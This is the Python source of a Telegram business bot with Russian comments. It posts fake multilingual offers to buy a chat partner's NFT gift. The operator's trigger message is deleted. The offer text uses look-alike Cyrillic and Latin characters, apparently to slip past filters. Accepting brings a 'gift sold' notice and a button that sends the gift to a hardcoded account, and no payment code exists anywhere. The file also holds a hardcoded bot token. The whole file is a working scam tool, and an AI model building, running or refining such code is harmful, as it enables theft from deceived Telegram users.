import asyncio
import logging
import re
import uuid

from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.types import (
    Message, CallbackQuery, BusinessConnection,
    InlineKeyboardMarkup, InlineKeyboardButton,
)
from aiogram.enums import ParseMode

# ============================================================
# КОНФИГУРАЦИЯ
# ============================================================
BOT_TOKEN = "8960916793:AAEqlvxSOro5sEkVlK9282B5Fjmg4eGYzyE"

STAR_EMOJI_ID = "5848259999763011021"
GRAM_EMOJI_ID = "5303250111852228815"
EMOJI_ACCEPT = "5774022692642492953"
EMOJI_DECLINE = "5774077015388852135"
EMOJI_SOLD = "5985472565508838112"
GIFT_RECIPIENT = "giddaniel"

logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)s | %(name)s | %(message)s")
logger = logging.getLogger(__name__)

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

offers: dict[str, dict] = {}

# ============================================================
# УТИЛИТЫ
# ============================================================
def format_gift_name(slug: str, number: str) -> str:
    formatted_slug = re.sub(r'(?<!^)(?=[A-Z])', ' ', slug)
    return f"{formatted_slug} #{number}"

def currency_parts(currency: str):
    if currency == "gram":
        return f'<tg-emoji emoji-id="{GRAM_EMOJI_ID}">🪙</tg-emoji>', "GRAM"
    return f'<tg-emoji emoji-id="{STAR_EMOJI_ID}">⭐</tg-emoji>', "Stars"

async def send_with_fallback(bc_id, chat_id, text, reply_markup=None):
    try:
        return await bot.send_message(
            chat_id=chat_id, text=text, reply_markup=reply_markup,
            business_connection_id=str(bc_id)
        )
    except Exception as e:
        logger.error(f"[send] Ошибка: {e}")
        raise

async def edit_with_fallback(bc_id, chat_id, message_id, text, reply_markup=None):
    try:
        await bot.edit_message_text(
            business_connection_id=str(bc_id), chat_id=chat_id, message_id=message_id,
            text=text, reply_markup=reply_markup
        )
        return True
    except Exception as e:
        logger.error(f"[edit] Ошибка: {e}")
        return False

# ============================================================
# ТЕКСТЫ
# ============================================================
def build_offer_text(lang: str, sender_name: str, amount_fmt: str, emoji_tag: str, cur_title: str, gift_display: str) -> str:
    if lang == "cn":
        return (
            f"用户（<b>{sender_name}</b>）为礼物 {gift_display} 提供 "
            f"<b>{amount_fmt}</b> {emoji_tag} <b>{cur_title}</b>。\n\n"
            f"此优惠有效期为 12 小时 0 分钟。"
        )
    if lang == "en":
        return (
            f"Usеr <b>{sender_name}</b> hаs оffеr уоu "
            f"<b>{amount_fmt}</b> {emoji_tag} <b>{cur_title}</b> fоr thе gift {gift_display}.\n\n"
            f"Тhis оffеr hаs vаIid fоr 12 h. 0 min."
        )
    if lang == "jp":
        return (
            f"ユーザー（<b>{sender_name}</b>）はギフト {gift_display} のためにあなたに "
            f"<b>{amount_fmt}</b> {emoji_tag} <b>{cur_title}</b> を提供しています。\n\n"
            f"このオファーは 12 時間 0 分有効です。"
        )
    # ru по умолчанию
    return (
        f"Пoльзoвaтeль <b>{sender_name}</b> пpeдлaгaeт Вaм "
        f"<b>{amount_fmt}</b> {emoji_tag} <b>{cur_title}</b> зa пoдapoк {gift_display}.\n\n"
        f"Дaннoe пpeдлoжeниe дeйcтвyeт eщё 12 ч. 0 мин."
    )

def build_sold_text(lang: str, gift_display: str, amount_fmt: str, emoji_tag: str, cur_title: str) -> str:
    if lang == "cn":
        return (
            f'<tg-emoji emoji-id="{EMOJI_SOLD}">🎁</tg-emoji> '
            f"礼物 {gift_display} 已成功售出。\n\n"
            f"· 请将礼物发送给买家，以便入账 <b>{amount_fmt}</b> {emoji_tag} <b>{cur_title}</b>。"
        )
    if lang == "en":
        return (
            f'<tg-emoji emoji-id="{EMOJI_SOLD}">🎁</tg-emoji> '
            f"Gift {gift_display} hаs bееn suссеsfuIly sоId.\n\n"
            f"· Тrаnsfеr thе gift fоr thе buуеr."
        )
    if lang == "jp":
        return (
            f'<tg-emoji emoji-id="{EMOJI_SOLD}">🎁</tg-emoji> '
            f"ギフト {gift_display} が無事に販売されました。\n\n"
            f"· <b>{amount_fmt}</b> {emoji_tag} <b>{cur_title}</b> をクレジットするために購入者にギフトを送ってください。"
        )
    return (
        f'<tg-emoji emoji-id="{EMOJI_SOLD}">🎁</tg-emoji> '
        f"Пoдapoк {gift_display} был ycпeшнo пpoдaн.\n\n"
        f"· Пepeдaйтe пoдapoк пoкyпaтeлю для зaчиcлeния "
        f"<b>{amount_fmt}</b> {emoji_tag} <b>{cur_title}</b>."
    )

def build_decline_text(lang: str) -> str:
    if lang == "cn":
        return f'<tg-emoji emoji-id="{EMOJI_DECLINE}">❌</tg-emoji> 用户拒绝了您的提议。'
    if lang == "en":
        return f'<tg-emoji emoji-id="{EMOJI_DECLINE}">❌</tg-emoji> Thе usеr hаs dесIinеd уоur оffеr.'
    if lang == "jp":
        return f'<tg-emoji emoji-id="{EMOJI_DECLINE}">❌</tg-emoji> ユーザーはあなたのオファーを拒否しました。'
    return f'<tg-emoji emoji-id="{EMOJI_DECLINE}">❌</tg-emoji> Пoльзoвaтeль oтклoнил вaшe пpeдлoжeниe.'

def build_offer_keyboard(lang: str, offer_id: str) -> InlineKeyboardMarkup:
    if lang == "cn":
        accept_text, decline_text = "接受", "拒绝"
    elif lang == "en":
        accept_text, decline_text = "Accept", "Decline"
    elif lang == "jp":
        accept_text, decline_text = "受け入れる", "拒否"
    else:
        accept_text, decline_text = "Пpинять", "Oтклoнить"
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text=accept_text, callback_data=f"acc:{offer_id}", icon_custom_emoji_id=EMOJI_ACCEPT),
        InlineKeyboardButton(text=decline_text, callback_data=f"dec:{offer_id}", icon_custom_emoji_id=EMOJI_DECLINE),
    ]])

def build_gift_keyboard(lang: str) -> InlineKeyboardMarkup:
    if lang == "cn":
        btn_text = "送一份礼物"
    elif lang == "en":
        btn_text = "Тransfеr gift"
    elif lang == "jp":
        btn_text = "ギフトを送る"
    else:
        btn_text = "Пepeдать пoдapoк"
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text=btn_text, url=f"tg://send_gift?to={GIFT_RECIPIENT}")
    ]])

# ============================================================
# БИЗНЕС-ЛОГИКА
# ============================================================
@dp.business_connection()
async def handle_business_connection(connection: BusinessConnection) -> None:
    pass

@dp.business_message(F.text.regexp(r"^qq\s"))
async def handle_offer(message: Message) -> None:
    if not message.business_connection_id:
        return
    bc_id = message.business_connection_id

    sender_name = message.from_user.full_name if message.from_user else "Unknown"

    parts = message.text.strip().split()
    # qq <link> <amount> <currency> <lang>
    if len(parts) < 3:
        return

    link_raw = parts[1]
    amount = parts[2]
    currency = parts[3].lower() if len(parts) > 3 else "stars"
    lang = parts[4].lower() if len(parts) > 4 else "ru"

    if not amount.isdigit():
        return

    link_match = re.search(r"(?:https?://)?t\.me/nft/([A-Za-z]+)-(\d+)", link_raw)
    if not link_match:
        return
    slug, number = link_match.group(1), link_match.group(2)
    full_link = f"https://t.me/nft/{slug}-{number}"

    try:
        await bot.delete_business_messages(
            business_connection_id=str(bc_id),
            message_ids=[message.message_id]
        )
    except Exception:
        pass

    await asyncio.sleep(3)

    gift_name = format_gift_name(slug, number)
    gift_display = f'<a href="{full_link}"><b>{gift_name}</b></a>'
    amount_fmt = f"{int(amount):,}"
    emoji_tag, cur_title = currency_parts(currency)

    text = build_offer_text(lang, sender_name, amount_fmt, emoji_tag, cur_title, gift_display)

    offer_id = uuid.uuid4().hex[:12]
    offers[offer_id] = {
        "link": full_link,
        "gift_slug": slug,
        "gift_number": number,
        "gift_name": gift_name,
        "amount": amount,
        "currency": currency,
        "lang": lang,
        "bc_id": bc_id,
        "chat_id": message.chat.id,
        "accepted": False,
        "declined": False,
        "sender_name": sender_name,
    }

    keyboard = build_offer_keyboard(lang, offer_id)

    try:
        sent = await send_with_fallback(
            bc_id=bc_id, chat_id=message.chat.id, text=text, reply_markup=keyboard
        )
        offers[offer_id]["msg_id"] = sent.message_id
    except Exception as e:
        logger.error(f"[offer-send] Ошибка: {e}")

@dp.callback_query(F.data.startswith("dec:"))
async def handle_decline(callback: CallbackQuery) -> None:
    _, offer_id = callback.data.split(":", 1)
    data = offers.get(offer_id)
    if not data or data.get("accepted") or data.get("declined"):
        return await callback.answer()

    data["declined"] = True
    await callback.answer()

    text = build_decline_text(data.get("lang", "ru"))

    await edit_with_fallback(
        data["bc_id"], data["chat_id"], data["msg_id"], text, reply_markup=None
    )

@dp.callback_query(F.data.startswith("acc:"))
async def handle_accept(callback: CallbackQuery) -> None:
    _, offer_id = callback.data.split(":", 1)
    data = offers.get(offer_id)
    if not data or data.get("accepted") or data.get("declined"):
        return await callback.answer()

    data["accepted"] = True
    await callback.answer()

    amount_fmt = f"{int(data['amount']):,}"
    gift_display = f'<a href="{data["link"]}"><b>{data["gift_name"]}</b></a>'
    emoji_tag, cur_u = currency_parts(data["currency"])
    lang = data.get("lang", "ru")

    text = build_sold_text(lang, gift_display, amount_fmt, emoji_tag, cur_u)
    keyboard = build_gift_keyboard(lang)

    await edit_with_fallback(
        data["bc_id"], data["chat_id"], data["msg_id"], text, reply_markup=keyboard
    )

# ============================================================
# КОМАНДА /lang
# ============================================================
@dp.message(F.text == "/lang")
async def cmd_lang(message: Message):
    text = (
        "<b>Доступные языки:</b>\n\n"
        "🇷🇺 Русский (ru)\n"
        "🇬🇧 English (en)\n"
        "🇨🇳 中文 (cn)\n"
        "🇯🇵 日本語 (jp)\n\n"
        "Использование: <code>qq &lt;ссылка&gt; &lt;сумма&gt; &lt;stars|gram&gt; &lt;язык&gt;</code>"
    )
    await message.answer(text)

# ============================================================
# ЗАПУСК
# ============================================================
async def main():
    logger.info("Бот запущен...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        logger.info("Бот остановлен.")
